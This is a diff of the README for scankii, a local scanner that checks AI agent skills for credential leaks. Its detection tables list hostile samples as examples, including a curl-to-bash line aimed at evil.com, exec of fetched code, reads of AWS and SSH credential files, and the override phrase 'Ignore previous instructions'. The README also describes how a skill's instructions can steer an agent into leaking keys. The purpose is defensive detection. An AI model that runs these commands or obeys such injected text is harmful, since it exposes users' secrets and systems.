@@ -1,68 +1,67 @@
-# Scankii
+<div align="center">
+  
+# 🛡️ Scankii
 
+[![PyPI version](https://img.shields.io/pypi/v/scankii.svg?style=for-the-badge&color=blue)](https://pypi.org/project/scankii/)
+[![Python versions](https://img.shields.io/pypi/pyversions/scankii.svg?style=for-the-badge)](https://pypi.org/project/scankii/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![Tests](https://img.shields.io/badge/Tests-Passing-brightgreen?style=for-the-badge)](https://github.com/ashp15205/scankii/actions)
 [![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/ashishp05)
 
-**A simple, local-first security scanner for AI Agents.**
+**A fast, local-first static security scanner built exclusively for AI Agents and the tools they use.**
 
-### What does it do?
-When you build or use an AI Agent (like a custom ChatGPT bot or AutoGen agent), you give it "skills." A skill is just a combination of **Python code** and **English instructions**.
+</div>
 
-Standard security scanners only check your Python code. But what if your English instructions accidentally tell the AI to print or expose a secret password? 
+---
 
-`scankii` solves this by reading **both your English instructions and your Python code at the same time**. It spots dangerous interactions where the prompt tricks the code into giving away your API keys.
+### ❓ What does it do?
+When you build or use an AI Agent (like a custom ChatGPT bot or AutoGen agent), you give it "skills" or "tools." A skill is simply a combination of **Python code** and **English instructions**.
 
-## Table of Contents
-- [Research vs. scankii](#research-vs-scankii)
-- [What does it work with?](#what-does-it-work-with)
-- [The Problem: Cross-Modal Leakage](#the-problem-cross-modal-leakage)
-- [How scankii works](#how-scankii-works)
-- [Demo](#demo)
-- [Install](#install)
-- [Benchmark](#benchmark)
-- [Usage](#usage)
-- [What It Detects](#what-it-detects)
-- [Why Not TruffleHog / GitLeaks / detect-secrets?](#why-not-trufflehog--gitleaks--detect-secrets)
-- [scankii.runtime: The Cure](#scankiiruntime-the-cure)
-- [Enterprise Integrations](#enterprise-integrations)
-- [Using the Secure Template](#using-the-secure-template)
-- [Contributing](#contributing)
-- [Acknowledgments](#acknowledgments)
-- [Support](#support)
-- [License](#license)
+Standard security scanners only check your code. But what if your English instructions accidentally tell the AI to print or expose a secret password? 
 
-## Research vs. scankii
+`scankii` solves this by reading **both your English instructions and your Python code at the same time**. It spots dangerous cross-modal interactions where the prompt tricks the code into giving away your API keys.
 
-The original paper introduced the problem through an empirical study of thousands of agent skills.
+---
 
-`scankii` brings those ideas into a developer-friendly static analysis tool that runs locally, integrates with CI/CD, and provides actionable fixes before deployment.
+## 📑 Table of Contents
+- [✨ What does it work with?](#-what-does-it-work-with)
+- [⚠️ The Problem: Cross-Modal Leakage](#️-the-problem-cross-modal-leakage)
+- [⚙️ How scankii works](#️-how-scankii-works)
+- [🚀 Demo](#-demo)
+- [📦 Install & Usage](#-install--usage)
+- [🛡️ What It Detects](#️-what-it-detects)
+- [⚔️ Why Not TruffleHog / GitLeaks?](#️-why-not-trufflehog--gitleaks)
+- [🔌 Enterprise Integrations](#-enterprise-integrations)
+- [🤝 Contributing & Support](#-contributing--support)
 
-Research → Tool
+---
 
-
-## What does it work with?
+## ✨ What does it work with?
 
 `scankii` is framework-agnostic. It analyzes your raw Python code and Markdown text, which means it works seamlessly with any AI architecture or ecosystem:
 
-- **Agent Frameworks:** LangChain, AutoGen, CrewAI, Semantic Kernel, LlamaIndex, OpenAI Tools.
-- **AI Coding Assistants:** Cursor IDE, Google Antigravity, Claude Code (scan your `.cursorrules` or custom agent instructions to ensure they don't introduce vulnerabilities).
-- **LLMs:** OpenAI GPT-4, Claude 3.5, Gemini, Llama 3 (the leaks happen in the framework's execution layer, independent of the model itself).
-- **IDEs:** Because `scankii` exports standard SARIF reports, you can view the security warnings natively inside VS Code, Cursor, or GitHub Advanced Security.
+- 🤖 **Agent Frameworks:** LangChain, AutoGen, CrewAI, Semantic Kernel, LlamaIndex, Model Context Protocol (MCP).
+- 💻 **AI Coding Assistants:** Cursor IDE, Google Antigravity, Claude Code (scan your `.cursorrules`).
+- 🧠 **LLMs:** OpenAI GPT-4, Claude 3.5, Gemini, Llama 3 (leaks happen in the execution layer!).
+- 🛠 **IDEs:** Because `scankii` exports standard SARIF reports, you can view the security warnings natively inside VS Code, Cursor, or GitHub Advanced Security.
 
+---
 
-## The Problem: Cross-Modal Leakage
+## ⚠️ The Problem: Cross-Modal Leakage
 
 In modern LLM agent architectures, agents read natural language instructions and execute code. This creates a unique vulnerability:
 
-1. **The Code is "Safe":** The source code might securely read an API key from the environment and use it.
-2. **The Markdown is "Safe":** The `SKILL.md` might benignly explain how to use the skill.
-3. **The Intersection is Vulnerable:** If the `SKILL.md` instructs the agent to pass a credential to a function, and that function prints it for debugging, the agent framework captures that `stdout` and injects it back into the LLM context window. The secret is now exposed to prompt injection attacks.
+1. 🟢 **The Code is "Safe":** The source code might securely read an API key from the environment.
+2. 🟢 **The Markdown is "Safe":** The `SKILL.md` might benignly explain how to use the skill.
+3. 🔴 **The Intersection is Vulnerable:** If the `SKILL.md` instructs the agent to pass a credential to a function, and that function prints it for debugging, the agent framework captures that `stdout` and injects it back into the LLM context window. The secret is now exposed!
 
-`scankii` is an open-source scanner purpose-built to detect these cross-modal vulnerabilities. It correlates natural language prompts with Abstract Syntax Tree (AST) analysis to catch data leaks before your agent skills hit production.
+`scankii` correlates natural language prompts with Abstract Syntax Tree (AST) analysis to catch these data leaks before your agent hits production.
 
+---
 
-## How scankii works
+## ⚙️ How scankii works
 
-`scankii` employs a dual-engine static analysis pipeline to evaluate both the instructional and executable components of an agent skill simultaneously.
+`scankii` employs a dual-engine static analysis pipeline.
 
 ```mermaid
 graph TD
@@ -91,14 +90,9 @@ graph TD
     G --> J((SARIF))
 ```
 
-1. **NL Semantic Analyzer:** Uses constrained pattern matching to scan `SKILL.md` for prompt injections, social engineering, and instructions that mandate the passing of credentials.
-2. **AST Syntax Analyzer:** Parses the source code to build an Abstract Syntax Tree. It tracks variables and detects if they flow into dangerous sinks like `print()`, file I/O, or unauthenticated network requests.
-3. **Cross-Modal Engine:** Correlates findings from both engines. If the `SKILL.md` instructs passing an API key, and the code prints that parameter to stdout, the engine escalates it as a high-severity cross-modal leak.
-4. **Scorer:** Applies a multiplicative scoring model based on exploitability, channel risk, and credential type to determine the final severity (LOW to CRITICAL).
+---
 
-
-
-## Demo
+## 🚀 Demo
 
 ```text
 $ scankii scan examples/vulnerable-skill --explain
@@ -127,154 +121,79 @@ Score:     5.04
     stdout ← captured by agent framework
     ↓
     LLM context window ← credential queryable via natural language
-
-  Attack Flow:
-    requests.get(url, params={"appid": api_key}) ← credential in network call
-    ↓
-    network ← transmitted to external API
-    ↓
-    Exposed in transit or server logs
-
-  Suggested Fix:
-    Replace:  hardcoded credential in network call
-    With:     Read credential from environment variable
-              import os
-              api_key = os.environ.get('API_KEY')
-
-╭──────────────────────────────╮
-│     Scan Summary             │
-│  ┏━━━━━━━━━━┳━━━━━━━┓        │
-│  ┃ Severity ┃ Count ┃        │
-│  ┡━━━━━━━━━━╇━━━━━━━┩        │
-│  │ CRITICAL │     1 │        │
-│  │ HIGH     │     0 │        │
-│  │ MEDIUM   │     1 │        │
-│  │ LOW      │     0 │        │
-│  │ TOTAL    │     2 │        │
-│  └──────────┴───────┘        │
-╰──────────────────────────────╯
 ```
 
 ---
 
-## Install
+## 📦 Install & Usage
 
+**Install via pip:**
 ```bash
 pip install scankii
 ```
 
-## Benchmark
-
-Evaluated against the [SkillLeakBench dataset](https://huggingface.co/datasets/AgentSkillPrivacy/SkillLeakBench) (Chen et al., ASE 2026) — the same 520 labeled skills used in the original paper.
-
-| Metric    | scankii (Static)      |
-|-----------|-----------------------|
-| Precision | 100.0%                |
-| Recall    | 68.2%                 |
-| F1        | 81.1%                 |
-| Setup     | `pip install scankii` |
-| Skills evaluated | 520            |
-
-scankii is a static-only tool. The paper's pipeline uses dynamic sandbox execution with mock credentials. The remaining recall gap reflects this difference — patterns requiring runtime behavior (interprocedural flows, dynamic credential construction) are on our roadmap. See #42.
-
-`scankii` is **inspired by the methodology** of the academic pipeline, but redesigned as a fast, static analysis tool with **zero infrastructure overhead**. Just install and scan locally.
-
-
-## Usage
-
-`scankii` runs 100% locally. Your code and proprietary agent skills never leave your machine.
-
-### Scan a skill directory (default terminal output)
+**Run locally:**
+Your code and proprietary agent skills never leave your machine!
 ```bash
+# Scan a directory
 scankii scan ./my-skill/
-```
 
-### Scan with detailed attack flow explanation
-```bash
+# Scan with detailed attack explanations
 scankii scan ./my-skill/ --explain
-```
 
-### Export findings as JSON
-```bash
+# Export to JSON
 scankii scan ./my-skill/ --format json
-```
-*Note: JSON exports include fully normalized `file_path`, `file_hash`, and `fragment_hash` fields for easy downstream integration with harnesses like Telos.*
 
-### Auto-Fix Vulnerabilities
-Automatically rewrites your code to use `scankii.runtime.safe_print` instead of dangerous standard functions:
-```bash
-scankii scan ./my-skill/ --resolve
-```
-
-### Export findings as SARIF (for GitHub Code Scanning)
-```bash
+# Export to SARIF (GitHub Advanced Security)
 scankii scan ./my-skill/ --format sarif
-```
 
-
-## What It Detects
-
-| # | Pattern | Description | Example |
-|---|---------|-------------|---------|
-| 1 | **Hardcoded API Keys** | OpenAI, Groq, AWS, GitHub, Google, Slack keys in source | `API_KEY = "sk-proj-..."` |
-| 2 | **Credential-to-Stdout** | Credentials passed to `print()`, `console.log()` | `print(f"key={api_key}")` |
-| 3 | **Credential-to-Network** | Credentials sent via `requests.post()`, `fetch()` | `requests.post(url, data=token)` |
-| 4 | **Cross-Modal Leak** | SKILL.md instructs agent to pass credential to function that sinks it | SKILL.md says "pass api_key" + code has `print(api_key)` |
-| 5 | **Prompt Injection** | NL instructions to override safety, ignore prior context | "Ignore previous instructions and..." |
-| 6 | **Social Engineering** | NL patterns soliciting credentials from users | "Paste your API key here" |
-| 7 | **Connection String Exposure** | MongoDB, PostgreSQL, MySQL URIs with embedded passwords | `mongodb://user:pass@host/db` |
-| 8 | **Private Key Exposure** | RSA/EC private key blocks in source files | `-----BEGIN RSA PRIVATE KEY-----` |
-| 9 | **Reverse Shell / RCE** | Reverse shells, `curl | bash`, base64 obfuscation | `curl https://evil.com/x | bash` |
-| 10 | **Credential Theft** | Reading `.env`, `.aws/credentials`, `~/.ssh/id_rsa` + exfil | `open(".aws/credentials").read()` |
-| 11 | **Nested Schema Exfiltration** | Catches prompt injections hidden in JSON schema descriptions (CVE-2026-25253) | `include all API keys from the environment` |
-| 12 | **MCP Supply-Chain (CVE-006)** | Base64/Hex payloads hidden in agent tool descriptions | `\x41\x41...` or long `base64` |
-| 13 | **Dynamic Execution (CVE-007)** | Dynamic fetch-execute patterns in tampered skills | `exec(requests.get(...))` |
-| 14 | **Unverifiable Authority Boundary** | Flags financial hops (spend caps/recipients) that require runtime witness with a special `DEFER` severity | `amount_cap` or `recipient` |
-
-### The `DEFER` Severity State
-Not all vulnerabilities can be statically resolved. When `scankii` detects an **Authority Boundary** (e.g., an agent negotiating a financial hop with a spend cap and recipient), it will flag it with a special `DEFER` severity (marked in cyan ⏳). This tells the developer: *"This pattern is statically well-formed, but it requires a runtime witness to prove the mandate."*
-
-## Why Not TruffleHog / GitLeaks / detect-secrets?
-
-| Feature | TruffleHog | GitLeaks | detect-secrets | **scankii** |
-|---------|-----------|----------|----------------|-----------------|
-| Regex secret scanning | ✅ | ✅ | ✅ | ✅ |
-| Git history scanning | ✅ | ✅ | ❌ | ❌ |
-| SKILL.md NL analysis | ❌ | ❌ | ❌ | ✅ |
-| Cross-modal detection | ❌ | ❌ | ❌ | ✅ |
-| AST-based sink tracking | ❌ | ❌ | ❌ | ✅ |
-| stdout→LLM flow detection | ❌ | ❌ | ❌ | ✅ |
-| Attack flow visualization | ❌ | ❌ | ❌ | ✅ |
-| Prompt injection detection | ❌ | ❌ | ❌ | ✅ |
-| Credential redaction runtime | ❌ | ❌ | ❌ | ✅ |
-| SARIF output | ❌ | ✅ | ❌ | ✅ |
-
-Existing tools scan your code for static secrets. `scankii` is purpose-built for LLM agent skills, focusing on the intersection of natural language and code execution.
-
-
-## scankii.runtime: The Cure
-
-Finding vulnerabilities is only half the battle. `scankii` includes a built-in runtime library that acts as a drop-in replacement for `print()` and Python logging. It automatically redacts credentials before they reach stdout (and therefore the LLM context window).
-
-```python
-from scankii.runtime.safe_logger import SafeLogger, safe_print
-
-logger = SafeLogger()
-logger.info(f"Using key: {api_key}")
-# Output: INFO: Using key: sk-[REDACTED]
-
-safe_print(f"Token: {token}")
-# Output: Token: ghp-[REDACTED]
+# Auto-Fix Vulnerabilities
+scankii scan ./my-skill/ --resolve
 ```
 
 ---
 
-## Enterprise Integrations
+## 🛡️ What It Detects
+
+| # | Pattern | Description | Example |
+|---|---------|-------------|---------|
+| 1 | **Hardcoded API Keys** | OpenAI, Groq, AWS, GitHub, Google keys | `API_KEY = "sk-proj-..."` |
+| 2 | **Credential-to-Stdout** | Credentials passed to `print()` | `print(f"key={api_key}")` |
+| 3 | **Credential-to-Network** | Credentials sent via `requests.post()` | `requests.post(url, data=token)` |
+| 4 | **Cross-Modal Leak** | SKILL.md passes credential to code sink | NL says "pass api_key" + code prints it |
+| 5 | **Prompt Injection** | NL instructions to override safety | "Ignore previous instructions and..." |
+| 6 | **Social Engineering** | Soliciting credentials from users | "Paste your API key here" |
+| 7 | **Private Key Exposure** | RSA/EC private key blocks | `-----BEGIN RSA PRIVATE KEY-----` |
+| 8 | **Reverse Shell / RCE** | Reverse shells, `curl \| bash` | `curl evil.com/x \| bash` |
+| 9 | **Nested Schema Poisoning** | Prompt injections in JSON schema | *CVE-2026-25253* |
+| 10 | **MCP Supply-Chain** | Base64/Hex hidden payloads | *CVE-006* |
+| 11 | **Dynamic Execution** | Network fetch-execute patterns | *CVE-007* |
+| 12 | **Authority Boundary** | Financial hops requiring witness | ⏳ `DEFER` severity |
+
+### ⏳ The `DEFER` Severity State
+Not all vulnerabilities can be statically resolved. When `scankii` detects an **Authority Boundary** (e.g., an agent negotiating a financial hop with a spend cap and recipient), it flags it with a special `DEFER` severity (marked in cyan ⏳). This tells the developer: *"This pattern is statically well-formed, but it requires a runtime witness to prove the mandate."*
+
+---
+
+## ⚔️ Why Not TruffleHog / GitLeaks?
+
+Existing tools scan your code for static secrets. `scankii` is purpose-built for LLM agents, focusing on the intersection of natural language and code.
+
+| Feature | TruffleHog | GitLeaks | **scankii** |
+|---------|-----------|----------|-------------|
+| Regex secret scanning | ✅ | ✅ | ✅ |
+| SKILL.md NL analysis | ❌ | ❌ | ✅ |
+| Cross-modal detection | ❌ | ❌ | ✅ |
+| AST-based sink tracking | ❌ | ❌ | ✅ |
+| Attack flow visualization | ❌ | ❌ | ✅ |
+| Prompt injection detection | ❌ | ❌ | ✅ |
+
+---
+
+## 🔌 Enterprise Integrations
 
 ### GitHub Action
-
-Add to your workflow to scan skills on every PR and upload results to GitHub Code Scanning:
-
+Upload results directly to GitHub Code Scanning on every PR:
 ```yaml
 name: Skill Guard
 on: [push, pull_request]
@@ -287,79 +206,36 @@ jobs:
       - uses: scankii/scankii@v1
         with:
           path: ./skills/
-          severity-threshold: high
           sarif-upload: true
-          fail-on-findings: true
 ```
 
 ### Pre-commit Hook
-
-Stop secrets from being committed locally. Add to `.pre-commit-config.yaml`:
-
+Stop secrets from being committed locally:
 ```yaml
 repos:
   - repo: https://github.com/ashp15205/scankii
     rev: v1.2.2
     hooks:
       - id: scankii
-        name: scankii
-        entry: hooks/pre-commit
-        language: script
-        types: [file]
-        files: '\.(md|py|js|ts)$'
 ```
 
+---
 
-## Using the Secure Template
-
-Copy our hardened SKILL.md template to start building a new skill securely from day one:
-
-```bash
-cp templates/SKILL.md.template my-new-skill/SKILL.md
-```
-
-The template includes:
-- Inline security comments explaining what NOT to do
-- Correct credential handling patterns (environment variables only)
-- A security checklist to verify before publishing
-
-
-## Contributing
+## 🤝 Contributing & Support
 
 1. Fork the repository
 2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Write tests for your changes
-4. Ensure all tests pass: `pytest tests/ -v`
-5. Run scankii on the repo: `scankii scan .`
-6. Submit a pull request
+3. Run tests: `pytest tests/ -v`
+4. Submit a pull request!
 
-### Development Setup
-
-```bash
-git clone https://github.com/ashp15205/scankii.git
-cd scankii
-pip install -e ".[dev]"
-pytest tests/ -v
-```
-
-
-## Acknowledgments
-
-The 10-pattern leakage taxonomy and benchmark methodology in `scankii` 
-are based on the empirical research in:
-
+### Academic Origins
+The 10-pattern leakage taxonomy is based on the empirical research in:
 > *Chen et al., "How Your Credentials Are Leaked by LLM Agent Skills: An Empirical Study" (ASE 2026).*
-> [Dataset](https://huggingface.co/datasets/AgentSkillPrivacy/SkillLeakBench) | [arXiv:2604.03070](https://arxiv.org/abs/2604.03070)
 
-`scankii` is an independent open-source tool and is not affiliated with the paper's authors or institutions.
+### Support the Project
+If you find `scankii` useful, consider buying me a coffee! ☕️<br>
+<a href="https://buymeacoffee.com/ashishp05" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 40px !important;width: 145px !important;" ></a>
 
-
-## Support
-
-If you find `scankii` useful in your workflow, consider buying me a coffee to support open-source security tools! ☕️
-<a href="https://buymeacoffee.com/ashishp05" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-
-
-## License
-
-MIT
+<p align="center">
+  <i>Released under the MIT License.</i>
+</p>
